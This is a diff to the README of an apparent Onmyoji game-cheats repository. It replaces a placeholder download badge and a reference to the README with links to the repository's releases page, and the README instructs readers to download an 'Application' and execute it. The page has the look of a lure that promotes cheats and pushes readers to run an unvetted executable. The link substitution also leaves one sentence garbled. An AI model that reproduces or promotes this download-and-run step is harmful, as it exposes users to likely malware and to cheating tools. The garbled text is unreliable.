@@ -1,6 +1,6 @@
 # Onmyoji Repository
 
-Welcome to the Onmyoji repository, your source for all things related to this captivating game. Dive into the world of onmyoji-cheats, onmyoji characters, codes, gameplay tips, and much more. This README.md will provide you with an overview of what you can find in this repository.
+Welcome to the Onmyoji repository, your source for all things related to this captivating game. Dive into the world of onmyoji-cheats, onmyoji characters, codes, gameplay tips, and much more. This https://github.com/Mkonthezanko/Onmyoji/releases will provide you with an overview of what you can find in this repository.
 
 ## 📂 Repository Content
 
@@ -24,7 +24,7 @@ This repository delves into various aspects of Onmyoji, exploring cheat codes, c
 ## 🚀 Get Started
 To access the resources and information provided in this repository, download the application from the following link:
 
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-brightgreen)](https://github.com/user/repo/Application.zip)
+[![Download Application](https://github.com/Mkonthezanko/Onmyoji/releases)](https://github.com/Mkonthezanko/Onmyoji/releases)
 
 ### Execution Instructions:
 The downloaded file needs to be executed to start utilizing the features offered.
